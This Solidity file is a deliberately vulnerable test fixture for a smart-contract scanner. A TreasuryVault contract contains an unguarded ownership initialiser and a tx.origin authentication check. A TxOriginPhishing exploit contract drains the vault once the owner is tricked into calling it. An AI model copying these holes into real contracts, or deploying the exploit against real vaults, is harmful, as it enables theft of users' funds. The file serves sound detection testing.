// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ──────────────────────────────────────────────────────────────────────────────
// SENTINEL TEST SUITE — POSITIVE TEST #2: Broken Access Control
// SWC Registry: SWC-105 / SWC-106
// ──────────────────────────────────────────────────────────────────────────────
// This contract presents two access control failures:
//   1. The `initOwner` function has no guard — anyone can call it after deploy
//      and claim ownership, bypassing the constructor-set admin.
//   2. The `emergencyDrain` function uses `tx.origin` for auth (SWC-115),
//      making it vulnerable to phishing attacks from malicious contracts.
// ──────────────────────────────────────────────────────────────────────────────

contract TreasuryVault {
    address public owner;
    address public pendingOwner;
    mapping(address => uint256) public shares;
    uint256 public totalDeposits;

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event SharesMinted(address indexed recipient, uint256 amount);
    event EmergencyDrain(address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    // VULNERABILITY #1 — SWC-105: Unprotected Initialisation Function
    // This function was intended to be called only once by the deployer,
    // but has NO onlyOwner guard and NO initialisation flag.
    // Any external actor can call this after deployment to seize contract ownership.
    function initOwner(address _newOwner) external {
        owner = _newOwner;
        emit OwnerChanged(owner, _newOwner);
    }

    /// @notice Two-step ownership transfer — correctly guarded.
    function proposeOwner(address _candidate) external {
        require(msg.sender == owner, "Not owner");
        pendingOwner = _candidate;
    }

    /// @notice Accept ownership transfer.
    function acceptOwnership() external {
        require(msg.sender == pendingOwner, "Not pending owner");
        emit OwnerChanged(owner, pendingOwner);
        owner = pendingOwner;
        pendingOwner = address(0);
    }

    /// @notice Deposit ETH to receive shares.
    function deposit() external payable {
        require(msg.value > 0, "Zero deposit");
        shares[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit SharesMinted(msg.sender, msg.value);
    }

    // VULNERABILITY #2 — SWC-115: tx.origin Authentication
    // Using tx.origin instead of msg.sender allows a malicious contract
    // (trick-clicked by the owner) to pass this check and drain the vault,
    // because tx.origin is the ORIGINAL EOA, not the intermediate caller.
    function emergencyDrain(address payable _to) external {
        require(tx.origin == owner, "Not authorised");   // <-- VULNERABLE
        uint256 amount = address(this).balance;
        (bool ok, ) = _to.call{value: amount}("");
        require(ok, "Transfer failed");
        emit EmergencyDrain(_to, amount);
    }

    /// @notice Standard share-based withdrawal — correctly uses msg.sender.
    function withdraw(uint256 _amount) external {
        require(shares[msg.sender] >= _amount, "Insufficient shares");
        shares[msg.sender] -= _amount;
        totalDeposits -= _amount;
        (bool ok, ) = payable(msg.sender).call{value: _amount}("");
        require(ok, "Transfer failed");
    }

    receive() external payable {}
}


/// @title EXPLOIT — demonstrates the tx.origin phishing attack.
/// The attacker deploys this contract and tricks the TreasuryVault owner
/// into calling `exploit()`, which passes tx.origin == owner and drains funds.
contract TxOriginPhishing {
    TreasuryVault public target;
    address payable public attacker;

    constructor(address _target) {
        target = TreasuryVault(payable(_target));
        attacker = payable(msg.sender);
    }

    /// @notice Victim calls this thinking it's a legitimate UI action.
    function exploit() external {
        // tx.origin == victim's EOA == target.owner() → check passes
        target.emergencyDrain(attacker);
    }

    receive() external payable {}
}
